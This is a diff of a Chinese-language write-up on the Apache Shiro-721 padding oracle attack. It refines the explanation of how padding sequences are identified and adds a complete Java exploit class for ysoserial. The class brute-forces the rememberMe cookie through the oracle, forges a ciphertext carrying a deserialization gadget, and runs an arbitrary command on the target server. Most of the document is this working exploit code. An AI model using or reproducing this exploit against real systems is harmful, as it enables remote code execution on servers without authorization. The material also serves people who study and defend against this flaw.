@@ -371,90 +371,26 @@ B 0x07 0x07 0x07 0x07 0x07 0x07 0x07
 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 
 ```
 
-我们将IV设置为0x00 00 00 00 00 00 00 00，与第一组密文一起发送给服务器，这意味着第一组密文变为了最后一组密文，它解密后与IV异或的结果等于它本身。之后会出现两种情况：
+我们将IV设置为0x00 00 00 00 00 00 00 00，与第一组密文一起发送给服务器，这意味着第一组密文变为了最后一组密文（需要填充），它解密后与IV异或的结果等于它本身。我们接着遍历IV的最后一个字节从0x00到0xff，当第一次出现填充序列正确时，记IV最后一位为m，我们要进行判断具体是哪一种填充序列（**可能由于非0x01结尾的概率较小，网上许多文章忽略了这一点**）。
 
-1. 填充序列正确：这说明第一组密文解密后，是之前8种填充序列其中之一（**可能由于概率较小，网上许多文章忽略了这一点**）
-2. 填充序列错误：与上面相反
-
-**接着1**，我们需要判断具体是哪一种填充序列，如何判断呢？抽象一下这个问题：已知一个序列为上面8个序列中的一种，有向量IV可以与它做异或，且我们知道异或的结果是否为8个序列中的一种，如何判断序列是哪一种？我这里举一个例子，可能不是最优解：
+如何判断呢？抽象一下这个问题：已知一个序列为上面8个序列中的一种，有向量IV可以与它做异或，且我们知道异或的结果是否为8个序列中的一种，如何判断序列是哪一种？我这里举一个例子，可能不是最优解：
 
 1. 先判断是否为`B B B B B B B 0x01`或`B B B B B B B 0x02`，判断方法如下：
-   1. 1 选择IV`0x00 0x00 0x00 0x00 0x00 0x00 X 0X03`，0x03^0x01==0x02，我们遍历x，如果存在**一种情况**使得服务器返回序列正确，这就说明序列为`B B B B B B B 0x01`，存在多种说明为`B B B B B B B 0x02`，不存在说明为其他
+   1. 1 选择IV`0x00 0x00 0x00 0x00 0x00 0x00 X 0X03^m`，0x03^0x01==0x02，我们遍历x，如果存在**一种情况**使得服务器返回序列正确，这就说明序列为`B B B B B B B 0x01`，存在多种说明为`B B B B B B B 0x02`，不存在说明为其他
 2. 若不为`B B B B B B B 0x01`和`B B B B B B B 0x02`，使用以下IV与序列进行异或，若哪次服务器返回的结果为序列正确，说明序列为与其对应的序列
 
 ```txt
-0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02 # 对应序列为B B B B B 0x03 0x03 0x03，后面按顺序类推
-0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x05
-0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x04
-0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x07
-0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x06
-0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x09
+0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02^m # 对应序列为B B B B B 0x03 0x03 0x03，后面按顺序类推
+0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x05^m
+0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x04^m
+0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x07^m
+0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x06^m
+0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x09^m
 ```
 
-这里给一个Python的算法实现，以作参考
-
-```python
-# shiro721，验证是否为合法序列
-from random import randint
-
-# 判断是否符合填充序列
-def server(seq):
-    for i in range(0x01,0x09):
-        if seq[-i:] == [i]*i:
-            return True
-    return False
-
-
-
-def check_seq(seq):
-    s01 = [0x00]*7+[0x03]
-    s03_to_08= [[0x00]*7+[i^0x01] for i in range(0x03,0x09)]
-
-    count = 0
-    x = 0x00
-    new_seq = [a^b for a,b in zip(seq,s01)]
-    while count < 2 and x < (0xff+1):
-        new_seq[6] = x^seq[6]
-        if server(new_seq):
-            count += 1
-        x += 1
-    if count == 1:
-        print("0x01")
-        return 0x01
-    elif count == 2:
-        print("0x02")
-        return 0x02
-    else:
-        print("other",end=":")
-        for s in s03_to_08:
-            if server([a^b for a,b in zip(seq,s)]):
-                print("0x{:0>2x}".format(s[-1]^0x01))
-                return s
-
-        print("worry")
-
-# 随机生成序列
-def random_seq():
-    rs = [ randint(0, 255) for i in range(0x01,0x09)]
-    return rs
-
-
-if __name__ == '__main__':
-    # 验证
-    for  i in range(0x00,0xffffff):
-        rs = random_seq()
-        if server(rs):
-            if rs[-1]!=0x01:
-                print(rs,end="------")
-                check_seq(rs)
-    #check_seq([115, 66, 251, 157, 64, 43, 2, 1])
-```
+参考代码在后续攻击代码中给出。
 
 我们一旦确定序列，例如为`B B B B B B 0x02 0x02`，我们就知道密文解密后（暂且将密文经过解密算法得到的结果称之为**middle**）的后两位为0x02，接着我们更改IV为`00 00 00 00 00 B 0x01 0x01`，异或的结果为`B B B B B B 0x03 0x03`，这个时候我们就对IV的倒数第三位进行爆破，如果这个时候服务器告诉我们填充序列正确，就说明middle此时为`B B B B B 0x03 0x03 0x03`，结合此刻IV的倒数第三位我们就可以推出middle倒数第三位的值，以此类推，我们就可以推理出middle的所有值，再结合初始的合法IV即可推理出明文。此外，在得知middle的值后，我们甚至还可以通过更改IV的值来将middle异或为我们想要的结果。
-
-**接着2**，更该IV为`00 00 00 00 00 00 00 B`，爆破IV最后一位的值，当服务器告诉我们填充序列正确时，说明此时middle为8个合法填充序列中的一种，然后接着步骤1进行操作。
-
-
 
 **几个问题**：
 
@@ -506,11 +442,269 @@ shiro721相关工具在使用时需要提供一个合法的RememberMe cookie，�
 
 ##### 攻击代码
 
-参考[longofo/PaddingOracleAttack-Shiro-721: Shiro-721 Padding Oracle Attack](https://github.com/longofo/PaddingOracleAttack-Shiro-721)，添加到ysoserial
+参考[longofo/PaddingOracleAttack-Shiro-721: Shiro-721 Padding Oracle Attack](https://github.com/longofo/PaddingOracleAttack-Shiro-721)，添加到ysoserial，ArrayUtil直接复制过去，Poracle做了一些修改以适应ysoserial，添加了之前分辨填充模式的代码，需要把该项目的日志配置文件也移植到ysoserial
 
-**Padding Oracle Attack：**
+![image-20241112111825895](./images/image-20241112111825895.png)
 
 ```java
+package ysoserial.exploit;
+
+import org.apache.http.Header;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.log4j.Logger;
+import ysoserial.Serializer;
+import ysoserial.exploit.utils.ArrayUtil;
+import ysoserial.payloads.CommonsCollections1;
+import ysoserial.payloads.ObjectPayload;
+import java.io.IOException;
+import java.util.Arrays;
+import java.util.Base64;
+import java.util.Random;
+
+public class Shiro721Exploit {
+    private static Logger logger = Logger.getLogger(Shiro721Exploit.class.getClass());
+    private byte[] plainText;
+    private int blockSize;
+    private int encryptBlockCount;
+    private String url;
+    private String loginRememberMe;
+    private int requestCount;
+
+    public Shiro721Exploit(byte[] plainText, int blockSize, String url, String loginRememberMe) throws IOException {
+        this.blockSize = blockSize;
+        this.plainText = this.paddingData(plainText);
+        this.url = url;
+        this.loginRememberMe = loginRememberMe;
+        this.requestCount = 0;
+    }
+
+
+    // payload填充
+    private byte[] paddingData(byte[] data) throws IOException {
+        int paddingLength = this.blockSize - (data.length % this.blockSize);
+
+        //计算要填充哪一个字节
+        byte paddingByte = (byte) paddingLength;
+        byte[] paddingBytes = new byte[paddingLength];
+        Arrays.fill(paddingBytes, paddingByte);
+
+        return ArrayUtil.mergerArray(data, paddingBytes);
+    }
+
+    private byte[] getBlockEncrypt(byte[] PlainTextBlock, byte[] nextCipherTextBlock) throws Exception {
+        byte[] tmpIV = new byte[this.blockSize];
+        byte[] encrypt = new byte[this.blockSize];
+        Arrays.fill(tmpIV, (byte) 0);
+
+        // 爆破nextCipherTextBlock在AES解密后的middle值
+        // rmpIV为当前爆破出的middle值
+        for (int index = this.blockSize - 1; index >= 0; index--) {
+            /* 分辨填充模式的代码，测试过几次，可以正常使用，但是笔者代码能力有限，放在这里还是仅作参考
+            if(index==this.blockSize-1){
+                index=identifyType(tmpIV,nextCipherTextBlock)+1;
+                continue;
+            }
+            */
+            tmpIV[index] = this.findCharacterEncrypt(index, tmpIV, nextCipherTextBlock);
+            logger.debug(String.format("Current string => %s, the %d block", ArrayUtil.bytesToHex(ArrayUtil.mergerArray(tmpIV, nextCipherTextBlock)), this.encryptBlockCount));
+        }
+
+        for (int index = 0; index < this.blockSize; index++) {
+            encrypt[index] = (byte) (tmpIV[index] ^ PlainTextBlock[index]);
+        }
+        return encrypt;
+    }
+
+    private boolean checkPaddingAttackRequest(String rememberMe) throws IOException {
+        CloseableHttpClient httpClient = HttpClients.createDefault();
+        HttpGet httpGet = new HttpGet(this.url);
+        CloseableHttpResponse response = null;
+        boolean success = true;
+
+        httpGet.addHeader("User-Agent", "Mozilla/5.0");
+        httpGet.addHeader("Referer", this.url);
+        httpGet.addHeader("Cookie", String.format("rememberMe=%s", rememberMe));
+
+        try {
+            response = httpClient.execute(httpGet);
+            this.requestCount += 1;
+            Header[] headers = response.getAllHeaders();
+            if (response.getStatusLine().getStatusCode() == 200) {
+                for (Header header : headers) {
+                    if (header.getName().equals("Set-Cookie") && header.getValue().contains("rememberMe=deleteMe"))
+                        success = false;
+                }
+            }
+        } catch (IOException e) {
+            logger.error("Request error when checkPaddingAttackRequest", e);
+        } finally {
+            if (response != null) response.close();
+            httpClient.close();
+        }
+        return success;
+    }
+
+    private boolean serverType(byte[] preBlock, byte[] nextCipherTextBlock) throws IOException {
+        // 将当前IV和要翻转攻击的分组拼接到合法cookie尾部
+        byte[] tmpBLock1 = Base64.getDecoder().decode(this.loginRememberMe);
+        byte[] tmpBlock2 = ArrayUtil.mergerArray(preBlock, nextCipherTextBlock);
+        byte[] tmpBlock3 = ArrayUtil.mergerArray(tmpBLock1, tmpBlock2);
+        String remeberMe = Base64.getEncoder().encodeToString(tmpBlock3);
+        return this.checkPaddingAttackRequest(remeberMe);
+    }
+
+    private int identifyType(byte[] tmpIV, byte[] nextCipherTextBlock) throws Exception {
+        byte[] preBLock = new byte[this.blockSize];
+        Arrays.fill(preBLock, (byte) 0);
+
+        // 爆破IV最后一位，找到合法填充序列
+        byte IV;
+        for (int c = 0; c < 256; c++) {
+            preBLock[this.blockSize-1] = (byte) c;
+            if (this.serverType(preBLock,nextCipherTextBlock)) {
+                // 记录爆破成功的IV值
+                IV = (byte) c;
+
+                byte[] testIv = new byte[this.blockSize];
+                Arrays.fill(testIv, (byte) 0);
+                testIv[this.blockSize-1] = (byte)(3^IV);
+                int count = 0;
+                int i=0;
+                while (count<2&&i<256){
+                    testIv[this.blockSize-2] = (byte) i;
+                    i++;
+                    if (this.serverType(testIv,nextCipherTextBlock))
+                        count++;
+                }
+
+                // 根据已经确定的填充序列，返回下一个要爆破的位
+                if(count==1) {
+                    tmpIV[this.blockSize-1]=(byte)(IV^1);
+                    return this.blockSize - 2;
+                }
+                else if (count==2) {
+                    tmpIV[this.blockSize-1]=(byte)(IV^2);
+                    tmpIV[this.blockSize-2]=(byte)2;
+                    return this.blockSize - 3;
+                }else {
+                    Arrays.fill(testIv, (byte) 0);
+                    for (int j=3;j<=this.blockSize;j++){
+                        // 确定是除0x01和0x02外的哪个填充序列
+                        testIv[this.blockSize-1]=(byte)(j^1^IV);
+                        if (this.serverType(testIv,nextCipherTextBlock)) {
+                            // 计算已经确定的中间值
+                            tmpIV[this.blockSize - 1] = (byte) (IV ^ j);
+                            for (int k = j; k > 1; k--) {
+                                tmpIV[this.blockSize - k] = (byte) j;
+                            }
+                            // 返回下一个要爆破的middle位
+                            return this.blockSize - j - 1;
+                        }
+                    }
+                }
+            }
+        }
+
+        throw new Exception("Occurs errors when find encrypt character, could't find a suiteable Character!!!");
+    }
+
+    private byte findCharacterEncrypt(int index, byte[] tmpIV, byte[] nextCipherTextBlock) throws Exception {
+        if (nextCipherTextBlock.length != this.blockSize) {
+            throw new Exception("CipherTextBlock size error!!!");
+        }
+
+        // 填充字符
+        byte paddingByte = (byte) (this.blockSize - index);
+
+        byte[] preBLock = new byte[this.blockSize];
+        Arrays.fill(preBLock, (byte) 0);
+
+        // preBLock为当前IV，它保证index+1及以后的位为paddingByte，我们需要爆破index位
+        // IV为已经爆破出的middle值
+        for (int ix = index; ix < this.blockSize; ix++) {
+            preBLock[ix] = (byte) (paddingByte ^ tmpIV[ix]);
+        }
+
+        for (int c = 0; c < 256; c++) {
+            //nextCipherTextBlock[index] < 256，那么在这个循环结果中构成的结果还是range(1,256)
+            //所以下面两种写法都是正确的，当时看到原作者使用的是第一种方式有点迷，测试了下都可以
+//            preBLock[index] = (byte) (paddingByte ^ nextCipherTextBlock[index] ^ c);
+            preBLock[index] = (byte) c;
+
+            // 将当前IV和要翻转攻击的分组拼接到合法cookie尾部
+            byte[] tmpBLock1 = Base64.getDecoder().decode(this.loginRememberMe);
+            byte[] tmpBlock2 = ArrayUtil.mergerArray(preBLock, nextCipherTextBlock);
+            byte[] tmpBlock3 = ArrayUtil.mergerArray(tmpBLock1, tmpBlock2);
+            String remeberMe = Base64.getEncoder().encodeToString(tmpBlock3);
+            if (this.checkPaddingAttackRequest(remeberMe)) {
+                return (byte) (preBLock[index] ^ paddingByte);
+            }
+            /*
+            if (this.checkPaddingAttackRequest(remeberMe)) {
+                return (byte) (preBLock[index] ^ paddingByte);
+            }
+            */
+        }
+        throw new Exception("Occurs errors when find encrypt character, could't find a suiteable Character!!!");
+    }
+
+    // 入参nextBLock为要翻转攻击的分组，未null时表示为payload的最后一个分组
+    public String encrypt(byte[] nextBLock) throws Exception {
+        logger.debug("Start encrypt data...");
+        byte[][] plainTextBlocks = ArrayUtil.splitBytes(this.plainText, this.blockSize);
+
+        if (nextBLock == null || nextBLock.length == 0 || nextBLock.length != this.blockSize) {
+            logger.warn("You provide block's size is not equal blockSize,try to reset it...");
+            nextBLock = new byte[this.blockSize];
+        }
+        byte randomByte = (byte) (new Random()).nextInt(127);
+        Arrays.fill(nextBLock, randomByte);
+
+        // 将payload翻转，由于CBC解密特性，CBC翻转攻击从payload的尾部开始
+        byte[] result = nextBLock;
+        byte[][] reverseplainTextBlocks = ArrayUtil.reverseTwoDimensionalBytesArray(plainTextBlocks);
+        this.encryptBlockCount = reverseplainTextBlocks.length;
+        logger.info(String.format("Total %d blocks to encrypt", this.encryptBlockCount));
+
+        for (byte[] plainTextBlock : reverseplainTextBlocks) {
+            // 每一块的CBC翻转攻击，nextBLock为当前翻转分组，plainTextBlock为要翻转为的结果，返回的IV作为下一块翻转分组
+            nextBLock = this.getBlockEncrypt(plainTextBlock, nextBLock);
+            result = ArrayUtil.mergerArray(nextBLock, result);
+
+            this.encryptBlockCount -= 1;
+            logger.info(String.format("Left %d blocks to encrypt", this.encryptBlockCount));
+        }
+
+        logger.info(String.format("Generate payload success, send request count => %s", this.requestCount));
+
+        return Base64.getEncoder().encodeToString(result);
+    }
+
+
+    public static void main(String[] args) throws Exception {
+
+        String targetUrl = args[0];
+        String rememberMeCookie = args[1];
+        int blockSize = Integer.parseInt(args[2]);
+        String gadget = CommonsCollections1.class.getPackage().getName() +  "." +  args[3].trim();
+        String command = args[4];
+
+
+        final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(gadget);
+        ObjectPayload payloadObj = payloadClass.newInstance();
+        Object payload = payloadObj.getObject(command);
+        byte[] ser = Serializer.serialize(payload);
+
+        Shiro721Exploit poracle = new Shiro721Exploit(ser, blockSize, targetUrl, rememberMeCookie);
+
+        logger.info(String.format("Result => %s", poracle.encrypt(null)));
+    }
+}
+
+
 ```
 
 
